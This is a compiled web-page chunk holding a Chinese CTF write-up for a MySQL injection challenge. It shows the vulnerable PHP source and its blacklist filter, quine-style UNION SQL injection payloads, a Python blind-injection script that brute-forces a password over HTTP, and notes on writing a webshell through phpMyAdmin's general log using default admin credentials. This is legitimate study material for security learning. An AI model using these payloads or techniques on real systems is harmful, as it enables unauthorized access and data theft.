import{_ as t,r as p,o as e,c as o,a as n,b as c,d as l,e as s}from"./app-R-nj5o9Q.js";const i={},u=s(`<p>#SQL 注入</p><p>查看源码</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token comment">&lt;!-- /?source --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span>
      <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>[/index.php](view-source:http://1.14.71.254:28878/index.php)<span class="token punctuation">&quot;</span></span>
      <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span>
    <span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>username<span class="token punctuation">&quot;</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>账号<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>密码<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>
      &lt;input type=&quot;submit&quot; / value=&quot;登录&quot;&gt;
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>加上/?source 可以查看源码</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;lib.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">alertMes</span><span class="token punctuation">(</span><span class="token variable">$mes</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;&lt;script&gt;alert(&#39;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$mes</span><span class="token punctuation">}</span></span>&#39;);location.href=&#39;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>&#39;;&lt;/script&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;hacker&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;&#39;</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;password&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;password&#39;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;password&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">&#39;admin&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;only admin can login&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">checkSql</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;SELECT password FROM users WHERE username=&#39;admin&#39; and password=&#39;<span class="token interpolation"><span class="token variable">$password</span></span>&#39;;&quot;</span><span class="token punctuation">;</span>
    <span class="token variable">$user_result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$user_result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;something wrong&quot;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;password&#39;</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">alertMes</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;wrong password&quot;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;index.php&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>



<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;source&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5),r={href:"https://www.cnblogs.com/zhengna/p/15917521.html",target:"_blank",rel:"noopener noreferrer"},k=s(`<p>通过分析发现只有输入正确的密码才能得到 FLAG，但是这张表其实是一张空表，所以爆破密码这条路走不通。</p><p>那就只有一个办法，就是构造一个输入输出完全一致的语句，就可以绕过限制并得到 FLAG</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">-- Quine基本形式：</span>
<span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span>‘str’<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>‘str’<span class="token punctuation">)</span>
<span class="token comment">-- 先将str里的双引号替换成单引号，再用str替换str里的.</span>
<span class="token comment">-- str基本形式（可以理解成上面的&quot;.&quot;）</span>
<span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">)</span>
<span class="token comment">-- 完整的Quine就是Quine基本形式+str基本形式</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>payload</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token number">1</span><span class="token string">&#39;/**/union/**/select/**/replace(replace(&#39;&#39;,char(34),char(39)),char(46),&#39;&#39;)#
-- 可理解成我们的Quine的基本形式
1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#
-- 这个就是我们str的基本形式

-- 先将str里的双引号替换成单引号
1&#39;</span><span class="token comment">/**/</span><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span><span class="token comment">#</span>
<span class="token comment">-- 最终通过来回替换的形式达到了我们的目的</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token number">1</span><span class="token string">&#39;/**/union/**/select/**/replace(replace(&#39;</span><span class="token number">1</span><span class="token string">&quot;/**/union/**/select/**/replace(repla
ce(&quot;</span><span class="token punctuation">.</span><span class="token string">&quot;,char(34),char(39)),char(46),&quot;</span><span class="token punctuation">.</span><span class="token string">&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;</span><span class="token comment">/**/</span>uni
<span class="token keyword">on</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">)</span><span class="token comment">#&#39;)#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>看到另一种：脚本跑密码</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests<span class="token punctuation">,</span>time
alp <span class="token operator">=</span> <span class="token string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span>
<span class="token keyword">def</span> <span class="token function">get_pass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">&quot;http://1.14.71.254:28610/index.php&quot;</span>
    flag <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> alp<span class="token punctuation">:</span>
            data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;admin&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f&quot;1&#39;or/**/password/**/like/**/&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>flag<span class="token operator">+</span>i<span class="token punctuation">}</span></span><span class="token string">%&#39;#&quot;</span></span><span class="token punctuation">}</span>
            resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">&quot;something wrong&quot;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag<span class="token operator">+=</span>i
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            <span class="token keyword">elif</span> <span class="token string">&quot;~&quot;</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>
                <span class="token keyword">return</span>
get_pass<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>另外一种</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://1.14.71.254:28590/phpmyadmin
admin：admin
直接查看admin的密码
可以loadfile写文件
编辑 编辑 general log文档 OFF
编辑 编辑 general log file文档
可以日志文件写shell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10);function d(v,m){const a=p("ExternalLinkIcon");return e(),o("div",null,[u,n("p",null,[n("a",r,[c("CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine 注入） - zhengna - 博客园 (cnblogs.com)"),l(a)])]),k])}const b=t(i,[["render",d],["__file","yet_another_mysql_injection.html.vue"]]);export{b as default};
